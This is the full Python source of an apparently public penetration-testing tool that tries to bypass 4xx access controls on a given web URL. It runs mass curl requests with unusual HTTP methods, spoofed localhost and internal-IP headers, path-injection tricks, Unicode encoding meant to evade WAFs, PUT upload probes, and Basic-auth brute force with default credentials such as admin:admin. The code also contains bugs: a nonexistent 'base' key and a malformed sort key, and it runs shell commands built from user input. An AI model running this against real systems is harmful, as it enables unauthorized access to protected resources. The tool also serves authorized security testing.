#!/usr/bin/env python3

import datetime
import sys
import urllib.parse
import os
import re
import base64
import concurrent.futures
import subprocess
import termcolor
import json

start = datetime.datetime.now()

# -------------------------- INFO --------------------------

def basic():
	global proceed
	proceed = False
	print("Forbidden v4.2 ( github.com/ivan-sincek/forbidden )")
	print("")
	print("Usage:   python3 forbidden.py -u url                       -t tests [-f force] [-v values    ] [-s safe            ] [-e encode] [-a agent      ] [-o out         ]")
	print("Example: python3 forbidden.py -u https://example.com/admin -t all   [-f GET  ] [-v values.txt] [-s /home/index.html] [-e all   ] [-a curl/3.30.1] [-o results.json]")

def advanced():
	basic()
	print("")
	print("DESCRIPTION")
	print("    Bypass 4xx HTTP response status codes")
	print("URL")
	print("    Specify an inaccessible URL")
	print("    Parameters and fragments are ignored")
	print("    -u <url> - https://example.com/admin | etc.")
	print("TESTS")
	print("    Specify tests to run")
	print("    -t <tests> - methods | method-overrides | headers | paths | auths | parsers | all")
	print("FORCE")
	print("    Force an HTTP method")
	print("    Test cases default to HTTP GET method (except special ones)")
	print("    -f <force> - GET | POST | CUSTOM | etc.")
	print("VALUES")
	print("    Specify a file with additional HTTP header values such as internal IPs, etc.")
	print("    Scope: headers")
	print("    -v <values> - values.txt | etc.")
	print("SAFE")
	print("    Specify an accessible URL path to test URL overrides")
	print("    Scope: headers")
	print("    Default: /robots.txt")
	print("    -s <safe> - /home/index.html | /README.txt | etc.")
	print("ENCODE")
	print("    Encode URL to Unicode to bypass WAF")
	print("    Original values are included")
	print("    -e <encode> - full | domain | path")
	print("AGENT")
	print("    Specify a user agent")
	print("    -a <agent> - curl/3.30.1 | etc.")
	print("OUT")
	print("    Specify an output file")
	print("    -o <out> - results.json | etc.")

# ------------------- MISCELENIOUS BEGIN -------------------

def replace_multiple_slashes(string):
	return re.sub(r"\/{2,}", "/", string)

def prepend_slash(string):
	const = "/"
	if not string or string[0] != const:
		string = const + string
	return string

def extend_path(path = None):
	const = "/"
	tmp = [const]
	if path:
		path = path.strip(const)
		if path:
			tmp = [const + path + const, path + const, const + path, path]
	return unique(tmp)

def append_paths(bases, paths):
	tmp = []
	const = "/"
	for base in bases:
		for path in paths:
			tmp.append(base.rstrip(const) + prepend_slash(path))
	return unique(tmp)

def get_directories(path = None):
	const = "/"
	directory = const
	tmp = [directory]
	if path:
		paths = path.split(const)
		for path in paths:
			if path:
				directory += path + const
				tmp.append(directory)
	return unique(tmp)

def extend_urls(scheme, domains, port = None):
	tmp = []
	if not port:
		port = 80
		if scheme == "https":
			port = 443
	for domain in domains:
		tmp.extend([
			domain,
			("{0}:{1}").format(domain, port),
			("{0}://{1}:{2}").format(scheme, domain, port)
		])
	return unique(tmp)

def unique(sequence):
	seen = set()
	return [x for x in sequence if not (x in seen or seen.add(x))]

def read_file(file):
	tmp = []
	with open(file, "r", encoding = "UTF-8") as stream:
		for line in stream:
			line = line.strip()
			if line:
				tmp.append(line)
	stream.close()
	return unique(tmp)

def write_file(out, data):
	confirm = "yes"
	if os.path.isfile(out):
		print(("'{0}' already exists").format(out))
		confirm = input("Overwrite the output file (yes): ")
	if confirm == "yes":
		open(out, "w").write(data)
		print(("Results have been saved to '{0}'").format(out))

# -------------------- MISCELENIOUS END --------------------

# -------------------- VALIDATION BEGIN --------------------

# my own validation algorithm

proceed = True

def print_error(msg):
	print(("ERROR: {0}").format(msg))

def error(msg, help = False):
	global proceed
	proceed = False
	print_error(msg)
	if help:
		print("Use -h for basic and --help for advanced info")

args = {"url": None, "tests": None, "force": None, "values": None, "safe": None, "encode": None, "agent": None, "out": None}

def validate(key, value):
	global args
	value = value.strip()
	if len(value) > 0:
		if key == "-u" and args["url"] is None:
			# TO DO: Better error handling
			args["url"] = urllib.parse.urlparse(value)
			if not args["url"].scheme:
				error("URL scheme is required")
			elif args["url"].scheme not in ["http", "https"]:
				error("Supported URL schemes are 'http' and 'https'")
			elif not args["url"].netloc:
				error("Invalid domain name")
			elif args["url"].port and (args["url"].port < 1 or args["url"].port > 65535):
				error("Port number is out of range")
		elif key == "-t" and args["tests"] is None:
			args["tests"] = value.lower()
			if args["tests"] not in ["methods", "method-overrides", "headers", "paths", "auths", "parsers", "all"]:
				error("Supported tests are 'methods', 'method-overrides', headers', 'paths', 'auths', 'parsers', or 'all'")
		elif key == "-f" and args["force"] is None:
			args["force"] = value.upper()
		elif key == "-v" and args["values"] is None:
			args["values"] = value
			if not os.path.isfile(args["values"]):
				error("File does not exists")
			elif not os.access(args["values"], os.R_OK):
				error("File does not have read permission")
			elif not os.stat(args["values"]).st_size > 0:
				error("File is empty")
			else:
				args["values"] = read_file(args["values"])
				if not args["values"]:
					error("No HTTP header values were found")
		elif key == "-s" and args["safe"] is None:
			args["safe"] = prepend_slash(replace_multiple_slashes(value))
		elif key == "-e" and args["encode"] is None:
			args["encode"] = value.lower()
			if args["encode"] not in ["full", "domain", "path"]:
				error("Supported encodings are 'full', 'domain', or 'path'")
		elif key == "-a" and args["agent"] is None:
			args["agent"] = value
		elif key == "-o" and args["out"] is None:
			args["out"] = value

def check(argc, args):
	count = 0
	for key in args:
		if args[key] is not None:
			count += 1
	return argc - count == argc / 2

argc = len(sys.argv) - 1

if argc == 0:
	advanced()
elif argc == 1:
	if sys.argv[1] == "-h":
		basic()
	elif sys.argv[1] == "--help":
		advanced()
	else:
		error("Incorrect usage", True)
elif argc % 2 == 0 and argc <= len(args) * 2:
	for i in range(1, argc, 2):
		validate(sys.argv[i], sys.argv[i + 1])
	if args["url"] is None or args["tests"] is None or not check(argc, args):
		error("Missing a mandatory option (-u, -t) and/or optional (-f, -v, -s, -e, -a, -o)", True)
else:
	error("Incorrect usage", True)

# --------------------- VALIDATION END ---------------------

# ------------------- TEST RECORDS BEGIN -------------------

def record(identifier, url, method, headers, agent, command):
	return {"id": identifier, "url": url, "method": method, "headers": headers, "agent": agent, "command": command, "code": 0, "length": 0}

def get_records(identifier, urls, methods, headers = None, agent = None, command = None):
	records = []
	if headers:
		for url in urls:
			for method in methods:
				for header in headers:
					identifier += 1
					records.append(record(identifier, url, method, header if isinstance(header, list) else [header], agent, command))
	else:
		for url in urls:
			for method in methods:
				identifier += 1
				records.append(record(identifier, url, method, [], agent, command))
	return records

# -------------------- TEST RECORDS END --------------------

# -------------------- STRUCTURES BEGIN --------------------

def unicode_encode(string):
	characters = [
		{
			"original": "a",
			"unicode": "\u1d2c"
		},
		{
			"original": "b",
			"unicode": "\u1d2e"
		},
		{
			"original": "d",
			"unicode": "\u1d30"
		},
		{
			"original": "e",
			"unicode": "\u1d31"
		},
		{
			"original": "g",
			"unicode": "\u1d33"
		},
		{
			"original": "h",
			"unicode": "\u1d34"
		},
		{
			"original": "i",
			"unicode": "\u1d35"
		},
		{
			"original": "j",
			"unicode": "\u1d36"
		},
		{
			"original": "k",
			"unicode": "\u1d37"
		},
		{
			"original": "l",
			"unicode": "\u1d38"
		},
		{
			"original": "m",
			"unicode": "\u1d39"
		},
		{
			"original": "n",
			"unicode": "\u1d3a"
		},
		{
			"original": "o",
			"unicode": "\u1d3c"
		},
		{
			"original": "p",
			"unicode": "\u1d3e"
		},
		{
			"original": "r",
			"unicode": "\u1d3f"
		},
		{
			"original": "t",
			"unicode": "\u1d40"
		},
		{
			"original": "u",
			"unicode": "\u1d41"
		},
		{
			"original": "w",
			"unicode": "\u1d42"
		}
	]
	for character in characters:
		string = string.replace(character["original"], character["unicode"])
	return string

def parse_url(url, encode = None):
	# TO DO: Do not ignore URL parameters and fragments.
	scheme = url.scheme.lower() + "://"
	domain = url.netloc.lower()
	port = url.port
	if not port:
		port = 80
		if url.scheme == "https":
			port = 443
		domain = ("{0}:{1}").format(domain, port)
	path = replace_multiple_slashes(url.path)
	tmp = {
		"urls": [],
		"full": [scheme + domain + path],
		"scheme_domains": [scheme + domain],
		"domains": [domain],
		"scheme": url.scheme,
		"bases": [url.netloc],
		"port": port,
		"paths": extend_path(path),
		"directories": append_paths([scheme + domain], get_directories(path)),
		"all": []
	}
	if encode == "full":
		tmp["full"].append(scheme + unicode_encode(domain + path))
		tmp["scheme_domains"].append(scheme + unicode_encode(domain))
		tmp["domains"].append(unicode_encode(domain))
		tmp["base"].append(unicode_encode(url.netloc))
		tmp["paths"].extend(extend_path(unicode_encode(path)))
		tmp["directories"].extend(append_paths([scheme + unicode_encode(domain)], get_directories(unicode_encode(path))))
	elif encode == "domain":
		tmp["full"].append(scheme + unicode_encode(domain) + path)
		tmp["scheme_domains"].append(scheme + unicode_encode(domain))
		tmp["domains"].append(unicode_encode(domain))
		tmp["base"].append(unicode_encode(url.netloc))
		tmp["directories"].extend(append_paths([scheme + unicode_encode(domain)], get_directories(path)))
	elif encode == "path":
		tmp["full"].append(scheme + domain + unicode_encode(path))
		tmp["paths"].extend(extend_path(unicode_encode(path)))
		tmp["directories"].extend(append_paths([scheme + domain], get_directories(unicode_encode(path))))
	tmp["urls"] = tmp["full"] + tmp["scheme_domains"] + tmp["domains"] + tmp["bases"]
	tmp["all"] = tmp["full"] + tmp["scheme_domains"] + tmp["domains"] + tmp["paths"]
	for key in tmp:
		if isinstance(tmp[key], list):
			tmp[key] = unique(tmp[key])
	return tmp

def get_methods():
	return [
		"ACL",
		"ARBITRARY",
		"BASELINE-CONTROL",
		"BIND",
		"CHECKIN",
		"CHECKOUT",
		"CONNECT",
		"COPY",
		# "DELETE", # NOTE: This HTTP method is dangerous!
		"GET",
		"HEAD",
		"INDEX",
		"LABEL",
		"LINK",
		"LOCK",
		"MERGE",
		"MKACTIVITY",
		"MKCALENDAR",
		"MKCOL",
		"MKREDIRECTREF",
		"MKWORKSPACE",
		"MOVE",
		"OPTIONS",
		"ORDERPATCH",
		"PATCH",
		"POST",
		"PRI",
		"PROPFIND",
		"PROPPATCH",
		"PUT",
		"REBIND",
		"REPORT",
		"SEARCH",
		"SHOWMETHOD",
		"SPACEJUMP",
		"TEXTSEARCH",
		"TRACE",
		"TRACK",
		"UNBIND",
		"UNCHECKOUT",
		"UNLINK",
		"UNLOCK",
		"UPDATE",
		"UPDATEREDIRECTREF",
		"VERSION-CONTROL"
	]

def get_method_override_headers(values):
	tmp = []
	for value in values:
		tmp.extend([
			("X-HTTP-Method: {0}").format(value),
			("X-HTTP-Method-Override: {0}").format(value),
			("X-Method-Override: {0}").format(value)
		])
	return unique(tmp)

def get_localhost_urls(scheme, port = None):
	return extend_urls(scheme, ["localhost", "127.0.0.1"], port)

def get_evil_urls(scheme, port = None):
	return extend_urls(scheme, ["github.com"], port)

def get_default_values(scheme, port = None, values = None):
	tmp = get_localhost_urls(scheme, port) + extend_urls(scheme, ["192.168.1.5"]) + get_evil_urls(scheme)
	if values:
		tmp.extend(values)
	return unique(tmp)

def get_headers(values):
	tmp = []
	for value in values:
		# TO DO: Separate HTTP headers in categories.
		tmp.extend([
			("Client-IP: {0}").format(value),
			("Cluster-Client-IP: {0}").format(value),
			("Connection: {0}").format(value),
			("Contact: {0}").format(value),
			("Forwarded: {0}").format(value),
			("Forwarded-For: {0}").format(value),
			("Forwarded-For-Ip: {0}").format(value),
			("From: {0}").format(value),
			("Host: {0}").format(value),
			("Origin: {0}").format(value),
			("Referer: {0}").format(value),
			("Stuff: {0}").format(value),
			("True-Client-IP: {0}").format(value),
			("X-Client-IP: {0}").format(value),
			("X-Custom-IP-Authorization: {0}").format(value),
			("X-Custom-IP-Authorization: {0};").format(value),
			("X-Custom-IP-Authorization: {0}.;").format(value),
			("X-Custom-IP-Authorization: {0}..;").format(value),
			("X-Forward: {0}").format(value),
			("X-Forwarded: {0}").format(value),
			("X-Forwarded-By: {0}").format(value),
			("X-Forwarded-For: {0}").format(value),
			("X-Forwarded-For-Original: {0}").format(value),
			("X-Forwarded-Host: {0}").format(value),
			("X-Forwarded-Server: {0}").format(value),
			("X-Forward-For: {0}").format(value),
			("X-Forwared-Host: {0}").format(value),
			("X-Host: {0}").format(value),
			("X-HTTP-Host-Override: {0}").format(value),
			("X-Original-URL: {0}").format(value),
			("X-Originating-IP: {0}").format(value),
			("X-Override-URL: {0}").format(value),
			("X-ProxyUser-IP: {0}").format(value),
			("X-Real-IP: {0}").format(value),
			("X-Remote-Addr: {0}").format(value),
			("X-Remote-IP: {0}").format(value),
			("X-Rewrite-URL: {0}").format(value),
			("X-Wap-Profile: {0}").format(value),
			("X-Server-IP: {0}").format(value),
			("X-Target: {0}").format(value)
		])
	return unique(tmp)

def get_double_host_headers(initials, overrides):
	tmp = []
	for initial in initials:
		for override in overrides:
			tmp.append([
				("Host: {0}").format(initial),
				("Host: {0}").format(override)
			])
	return tmp

def get_bypass_urls(urls):
	tmp = []
	const = "/"
	for url in urls:
		url = urllib.parse.urlparse(url)
		scheme = url.scheme + "://"
		tmp.append(scheme + url.netloc + url.path.rstrip(const))
		path = url.path.strip(const)
		bypasses = []
		# ------------------------------
		injections = ["", "%09", "%20", "%2e", ".", "..", ";", ".;", "..;", ";foo=bar;"]
		for injection in injections:
			extended = [const + injection + const, injection + const, const + injection, injection]
			for i in extended:
				bypasses.extend([path + i, i + path])
				if path:
					for j in extended:
						bypasses.extend([i + path + j])
		# ------------------------------
		paths = [path, path + const]
		injections = ["~", "*", "#", "?"]
		for p in paths:
			if p:
				for injection in injections:
					extended = [injection, injection + injection, injection + "random"]
					for i in extended:
						bypasses.extend([path + i])
		# ------------------------------
		if path and url.path[-1] != const:
			injections = [".php", ".jsp", ".jspa", ".jspx", ".jhtml", ".html", ".sht", ".shtml", ".xhtml", ".asp", ".aspx", ".esp"]
			for i in injections:
				bypasses.extend([path + i])
		# ------------------------------
		for bypass in bypasses:
			tmp.append(scheme + url.netloc + prepend_slash(bypass))
	return unique(tmp)

def get_basic_auth_headers():
	tmp = ["Authorization: Bearer null", "Authorization: Basic null"]
	usernames = ["admin", "root", "tomcat", "cisco"]
	passwords = ["admin", "root", "toor", "tomcat", "cisco", "password", "default", "secret"]
	for username in usernames:
		for password in passwords:
			credentials = username + ":" + password
			credentails = base64.b64encode(credentials.encode("UTF-8")).decode("UTF-8")
			tmp.append(("Authorization: Basic {0}").format(credentails))
	return unique(tmp)

def get_parser_urls(initials, overrides):
	tmp = []
	injections = ["@", " @", "#@"]
	for initial in initials:
		for override in overrides:
			for injection in injections:
				tmp.append(initial + injection + override)
	return unique(tmp)

# --------------------- STRUCTURES END ---------------------

# ----------------------- TASK BEGIN -----------------------

def filter(collection):
	tmp = []
	commands = []
	for record in collection:
		if record["command"] not in commands:
			commands.append(record["command"])
			tmp.append(record)
	return tmp

def get_collection(url, tests, force = None, values = [], safe = None, agent = None):
	print(("Prepared URLs:\n{0}").format(json.dumps(url["full"], indent = 4, ensure_ascii = False)))
	collection = []
	identifier = 0
	if tests in ["methods", "all"]:
		local = {
			"urls": {
				"uploads": append_paths(url["directories"], ["pentest.txt"])
			},
			"methods": get_methods(),
			"headers": {
				"content-lengths": ["Content-Length: 0"],
				"content-types": [[], "Content-Type: text/plain"],
				"xst": ["XSTH: XSTV"]
			}
		}
		if force:
			local["methods"] = [force]
		# NOTE: Test various HTTP methods.
		records = get_records(identifier, url["full"], local["methods"], None, agent)
		identifier = len(records)
		collection.extend(records)
		# NOTE: Test various HTTP methods with 'Content-Length: 0' header.
		records = get_records(identifier, url["full"], local["methods"], local["headers"]["content-lengths"], agent)
		identifier = len(records)
		collection.extend(records)
		# NOTE: Test cross-site tracing (XST) with HTTP TRACE and TRACK methods.
		# NOTE: To confirm the vulnerability, check if 'XSTH: XSTV' header is returned in HTTP response.
		records = get_records(identifier, url["full"], ["TRACE", "TRACK"], local["headers"]["xst"], agent)
		identifier = len(records)
		collection.extend(records)
		# NOTE: Test file upload with HTTP PUT method.
		records = get_records(identifier, local["urls"]["uploads"], ["PUT"], local["headers"]["content-types"], agent, ["-d 'pentest'"])
		identifier = len(records)
		collection.extend(records)
	if tests in ["method-overrides", "all"]:
		local = {
			"methods": get_methods(),
			"headers": {
				"method-overrides": get_method_override_headers(get_methods())
			}
		}
		if force:
			local["headers"]["method-overrides"] = get_method_override_headers([force])
		# NOTE: Test various HTTP method overrides.
		records = get_records(identifier, url["full"], local["methods"], local["headers"]["method-overrides"], agent)
		identifier = len(records)
		collection.extend(records)
	if tests in ["headers", "all"]:
		local = {
			"urls": {
				"accessible": append_paths(url["scheme_domains"], ["robots.txt"])
			},
			"methods": ["GET"],
			"headers": {
				"every": get_headers(get_default_values(url["scheme"], url["port"], url["all"] + values)),
				"paths": get_headers(url["full"] + url["paths"]),
				"hosts": get_double_host_headers(url["urls"], get_evil_urls(url["scheme"]))
			}
		}
		if safe:
			local["urls"]["accessible"] = append_paths(url["scheme_domains"], [safe])
		if force:
			local["methods"] = [force]
		# NOTE: Test various HTTP headers with a full URL and every value (including user supplied values).
		records = get_records(identifier, url["full"], local["methods"], local["headers"]["every"], agent)
		identifier = len(records)
		collection.extend(records)
		# NOTE: Test various HTTP headers with a base URL and only path values.
		records = get_records(identifier, url["scheme_domains"], local["methods"], local["headers"]["paths"], agent)
		identifier = len(records)
		collection.extend(records)
		# NOTE: Test various HTTP headers with an accessible URL and only path values.
		records = get_records(identifier, local["urls"]["accessible"], local["methods"], local["headers"]["paths"], agent)
		identifier = len(records)
		collection.extend(records)
		# NOTE: Test URL override with two 'Host' headers.
		records = get_records(identifier, url["full"], local["methods"], local["headers"]["hosts"], agent)
		identifier = len(records)
		collection.extend(records)
	if tests in ["paths", "all"]:
		local = {
			"urls": {
				"bypass": get_bypass_urls(url["full"])
			},
			"methods": ["GET"]
		}
		if force:
			local["methods"] = [force]
		# NOTE: Test various URL path bypasses.
		records = get_records(identifier, local["urls"]["bypass"], local["methods"], None, agent)
		identifier = len(records)
		collection.extend(records)
	if tests in ["auths", "all"]:
		local = {
			"methods": ["GET"],
			"headers": {
				"auths": get_basic_auth_headers()
			}
		}
		if force:
			local["methods"] = [force]
		# NOTE: Test basic authentication/authorization.
		records = get_records(identifier, url["full"], local["methods"], local["headers"]["auths"], agent)
		identifier = len(records)
		collection.extend(records)
	if tests in ["parsers", "all"]:
		local = {
			"methods": ["GET"],
			"headers": {
				"parsers": get_headers(get_parser_urls(url["urls"], get_evil_urls(url["scheme"])))
			}
		}
		if force:
			local["methods"] = [force]
		# NOTE: Test broken URL parsers.
		records = get_records(identifier, url["full"], local["methods"], local["headers"]["parsers"], agent)
		identifier = len(records)
		collection.extend(records)
	return collection

def get_commands(collection):
	for record in collection:
		# NOTE: You can intercept requests with your local proxy by adding "--proxy 127.0.0.1:8080".
		# TO DO: Add proxy as an option.
		curl = ["curl", "-w 'FBD-CL:%{size_download}'", "-m 5", "--connect-timeout 5", "-i", "-s", "-k", "-L", "--path-as-is"]
		if record["command"]:
			curl.extend(record["command"])
		if record["headers"]:
			for header in record["headers"]:
				curl.append(("-H '{0}'").format(header))
		if record["agent"]:
			curl.append(("-H 'User-Agent: {0}'").format(record["agent"]))
		curl.append(("-X '{0}'").format(record["method"]))
		curl.append(("'{0}'").format(record["url"]))
		record["command"] = (" ").join(curl)
	return collection

def run(record):
	response = subprocess.run(record["command"], stdout = subprocess.PIPE, shell = True).stdout.decode("UTF-8")
	if response:
		array = re.findall(r"(?<=FBD\-CL\:)\d+", response, re.IGNORECASE)
		if array and array[0].isdigit():
			record["length"] = int(array[0])
		array = response.split("\r\n", 1)[0].split(" ")
		if len(array) > 1 and array[1].isdigit():
			record["code"] = int(array[1])
	return record

def output(record, color):
	print(termcolor.colored(json.dumps(record, indent = 4, ensure_ascii = False), color))
	return record

def validate(results):
	tmp = []
	results = [record for record in results if record["code"]]
	results = sorted(results, key = lambda x: (x["code"], -x["length"], ["id"]))
	for record in results:
		if record["code"] >= 500:
			continue
			tmp.append(output(record, "cyan"))
		elif record["code"] >= 400:
			continue
			tmp.append(output(record, "red"))
		elif record["code"] >= 300:
			# continue
			tmp.append(output(record, "yellow"))
		elif record["code"] >= 200:
			# continue
			tmp.append(output(record, "green"))
	return tmp

def progress(count, total):
	end = "\r"
	if count == total:
		end = "\n"
	print(("Progress: {0}/{1} | {2:.2f}%").format(count, total, (count / total) * 100), end = end)

def bypass(collection, out = None):
	results = []
	count = 0
	total = len(collection)
	print(("Number of created test records: {0}").format(total))
	progress(count, total)
	with concurrent.futures.ThreadPoolExecutor(max_workers = 200) as executor:
		subprocesses = {executor.submit(run, record): record for record in collection}
		for subprocess in concurrent.futures.as_completed(subprocesses):
			results.append(subprocess.result())
			count += 1
			progress(count, total)
	results = validate(results)
	if not results:
		print("No result matched the validation criteria")
	elif out:
		write_file(out, json.dumps(results, indent = 4, ensure_ascii = False))

if proceed:
	print("######################################################################")
	print("#                                                                    #")
	print("#                           Forbidden v4.2                           #")
	print("#                                by Ivan Sincek                      #")
	print("#                                                                    #")
	print("# Bypass 4xx HTTP response status codes.                             #")
	print("# GitHub repository at github.com/ivan-sincek/forbidden.             #")
	print("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14. #")
	print("#                                                                    #")
	print("######################################################################")
	if not args["values"]:
		args["values"] = []
	collection = get_collection(parse_url(args["url"], args["encode"]), args["tests"], args["force"], args["values"], args["safe"], args["agent"])
	if not collection:
		print("No test records were created")
	else:
		bypass(filter(get_commands(collection)), args["out"])
	print(("Script has finished in {0}").format(datetime.datetime.now() - start))

# ------------------------ TASK END ------------------------
